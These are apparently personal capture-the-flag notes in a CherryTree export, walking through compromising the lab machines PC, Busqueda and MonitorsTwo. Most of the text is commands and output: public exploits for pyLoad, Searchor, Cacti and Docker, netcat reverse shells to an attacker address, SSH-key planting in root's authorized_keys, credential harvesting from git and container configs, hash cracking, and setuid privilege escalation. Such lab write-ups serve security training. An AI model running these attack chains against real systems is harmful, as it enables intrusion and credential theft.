/tmp/pyLoad

sau@pc:/tmp/pyLoad$ ss -tlnp
State      Recv-Q     Send-Q          Local Address:Port            Peer Address:Port     Process     
LISTEN     0          4096            127.0.0.53%lo:53                   0.0.0.0:*                    
LISTEN     0          128                   0.0.0.0:22                   0.0.0.0:*                    
LISTEN     0          5                   127.0.0.1:8000                 0.0.0.0:*                    
LISTEN     0          128                   0.0.0.0:9666                 0.0.0.0:*                    
LISTEN     0          128                      [::]:22                      [::]:*                    
LISTEN     0          4096                        *:50051                      *:* 



google for pyload exploit

</rich_text>
        <rich_text link="webs https://www.exploit-db.com/exploits/51532">https://www.exploit-db.com/exploits/51532</rich_text>
        <rich_text>

first local port forward

ssh -L 8000:127.0.0.1:8000 sau@10.129.130.68

then run exploit

put my public key in /tmp/test.pub

python3 exploit.py -u </rich_text>
        <rich_text link="webs http://127.0.0.1:8000">http://127.0.0.1:8000</rich_text>
        <rich_text> -c "mkdir /root/.ssh;cat /tmp/test.pub &gt; /root/.ssh/authorized_keys;chmod 600 /root/.ssh/authorized_keys"

ssh root@10.129.130.68
Last login: Mon May 15 09:01:48 2023 from 10.10.14.19
root@pc:~# 
root@pc:~# id
uid=0(root) gid=0(root) groups=0(root)
root@pc:~# ls
Downloads  root.txt  snap  sqlite.db.bak
root@pc:~# cat root.txt 
3dc15d6ad95fd29294eb49b9dfe53d86</rich_text>
      </node>
    </node>
    <node name="Busqueda" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691060196" ts_lastsave="1691135374">
      <node name="nmap" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691060201" ts_lastsave="1691060446">
        <rich_text>sudo nmap -p- -sC -sV 10.129.129.5 -oA nmap/all -v 
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-08-03 06:54 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
Initiating Ping Scan at 06:54
Scanning 10.129.129.5 [4 ports]
Completed Ping Scan at 06:54, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:54
Completed Parallel DNS resolution of 1 host. at 06:54, 0.01s elapsed
Initiating SYN Stealth Scan at 06:54
Scanning 10.129.129.5 [65535 ports]
Discovered open port 22/tcp on 10.129.129.5
Discovered open port 80/tcp on 10.129.129.5
Completed SYN Stealth Scan at 06:55, 15.19s elapsed (65535 total ports)
Initiating Service scan at 06:55
Scanning 2 services on 10.129.129.5
Completed Service scan at 06:55, 6.08s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.129.5.
Initiating NSE at 06:55
Completed NSE at 06:55, 1.19s elapsed
Initiating NSE at 06:55
Completed NSE at 06:55, 0.14s elapsed
Initiating NSE at 06:55
Completed NSE at 06:55, 0.00s elapsed
Nmap scan report for 10.129.129.5
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
        <rich_text>
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 06:55
Completed NSE at 06:55, 0.00s elapsed
Initiating NSE at 06:55
Completed NSE at 06:55, 0.00s elapsed
Initiating NSE at 06:55
Completed NSE at 06:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 23.36 seconds
           Raw packets sent: 65749 (2.893MB) | Rcvd: 65536 (2.621MB)</rich_text>
      </node>
      <node name="buster" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691060446" ts_lastsave="1691060507">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
        <rich_text>

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c </rich_text>
        <rich_text link="webs http://searcher.htb/search">http://searcher.htb/search</rich_text>
        <rich_text>
200      GET      430l      751w    13519c </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
        <rich_text>
403      GET        9l       28w      277c </rich_text>
        <rich_text link="webs http://searcher.htb/server-status">http://searcher.htb/server-status</rich_text>
        <rich_text>
[####################] - 88s    30001/30001   0s      found:3       errors:58     
[####################] - 88s    30000/30000   342/s   </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
      </node>
      <node name="exploit" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691060507" ts_lastsave="1691070499">
        <rich_text>its running Searchor 2.4.0

google for exploit

</rich_text>
        <rich_text link="webs https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</rich_text>
        <rich_text>

./exploit.sh searcher.htb 10.10.14.41
---[Reverse Shell Exploit for Searchor &lt;= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.14.41:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.129.129.5] 37176
bash: cannot set terminal process group (1458): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ id
id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
svc@busqueda:/var/www/app$ whoami
whoami
svc
svc@busqueda:~$ cat user	
cat user.txt 
43f6815d624e9f81763b1050e148ac8c

svc@busqueda:~$ cat .gitconfig
cat .gitconfig
[user]
	email = cody@searcher.htb
	name = cody
[core]
	hooksPath = no-hooks
	
put my public key in authorized keys so i can ssh in

svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = </rich_text>
        <rich_text link="webs http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git">http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</rich_text>
        <rich_text>
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main



cody:jh1usoih2bkjaspwe92


use password for cody

svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Sorry, try again.
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
   
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
     
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
     
"Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],


    "Env": [
      "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
      "MYSQL_USER=gitea",
      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
      "MYSQL_DATABASE=gitea",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "GOSU_VERSION=1.14",
      "MYSQL_MAJOR=8.0",
      "MYSQL_VERSION=8.0.31-1.el8",
      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
    ],


login to gitea as administrator with password yuiu1hoiu4i5ho1uh

clone repo scripts

cat system-checkup.py

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            
create file full-checkup.sh with rev shell

file must have #!/bin/bash at top



nc -lvnp 9001             
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.129.129.5] 44230
root@busqueda:/home/svc# id
id
uid=0(root) gid=0(root) groups=0(root)
root@busqueda:/home/svc# cd  
cd 
root@busqueda:~# ls
ls
ecosystem.config.js
root.txt
scripts
snap
root@busqueda:~# cat roo	
cat root.txt 
e43948efddf9a672c8bb00d82eb0f038</rich_text>
      </node>
    </node>
    <node name="MonitorsTwo" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691135374" ts_lastsave="1691135377">
      <node name="nmap" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691135377" ts_lastsave="1691135720">
        <rich_text>sudo nmap -p- -sC -sV 10.129.128.135 -oA nmap/all -v
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-08-04 03:53 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating Ping Scan at 03:53
Scanning 10.129.128.135 [4 ports]
Completed Ping Scan at 03:53, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:53
Completed Parallel DNS resolution of 1 host. at 03:53, 0.01s elapsed
Initiating SYN Stealth Scan at 03:53
Scanning 10.129.128.135 [65535 ports]
Discovered open port 80/tcp on 10.129.128.135
Discovered open port 22/tcp on 10.129.128.135
Completed SYN Stealth Scan at 03:53, 14.67s elapsed (65535 total ports)
Initiating Service scan at 03:53
Scanning 2 services on 10.129.128.135
Completed Service scan at 03:53, 6.37s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.128.135.
Initiating NSE at 03:53
Completed NSE at 03:53, 2.42s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.43s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.01s elapsed
Nmap scan report for 10.129.128.135
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 24.56 seconds
           Raw packets sent: 65557 (2.884MB) | Rcvd: 65536 (2.621MB)</rich_text>
      </node>
      <node name="buster" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691135720" ts_lastsave="1691135931"/>
      <node name="exploit" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691135931" ts_lastsave="1691140044">
        <rich_text>webserver runs cacti 1.2.22

google for exploit

</rich_text>
        <rich_text link="webs https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22">https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22</rich_text>
        <rich_text>


python3 exploit.py -u </rich_text>
        <rich_text link="webs http://10.129.128.135/">http://10.129.128.135/</rich_text>
        <rich_text> --LHOST=10.10.14.41 --LPORT=9001
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.129.128.135] 45720
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@50bca5e748b0:/var/www/html$ whoami
whoami
www-data


run linpeas.sh

/sbin/capsh has SETUID

search in gtfobins

www-data@50bca5e748b0:/dev/shm$ /sbin/capsh --gid=0 --uid=0 -- 
/sbin/capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
whoami
root


www-data@50bca5e748b0:/$ cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"


www-data@50bca5e748b0:/var/www/html$ mysql -h db -u root -p
mysql -h db -u root -p
Enter password: root
use cacti;
select * from user_auth;
exit
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	1	1	1on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1		0	00
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	1	1	1	1	1on	-1	-1		on	0	0	2135691668


crack with hashcat


 hashcat -m 3200 hash rockyou.txt
hashcat (v6.2.6) starting

$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey


ssh marcus@10.129.128.135
marcus@10.129.128.135's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

marcus@monitorstwo:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
marcus@monitorstwo:~$ whoami
marcus
marcus@monitorstwo:~$ cat user.txt 
e644401fa8148c709c70f8dc65c04ace


run linpeas.sh


google for exploit

</rich_text>
        <rich_text link="webs https://github.com/UncleJ4ck/CVE-2021-41091">https://github.com/UncleJ4ck/CVE-2021-41091</rich_text>
        <rich_text>


marcus@monitorstwo:/dev/shm$ ./exploit.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[&gt;] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[&gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:/dev/shm$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# whoami
root

bash-5.1# cat /root/root.txt
cebacac4cd8f8d5c18173d4ef71c24e6</rich_text>
      </node>
    </node>
  </node>
</cherrytree>
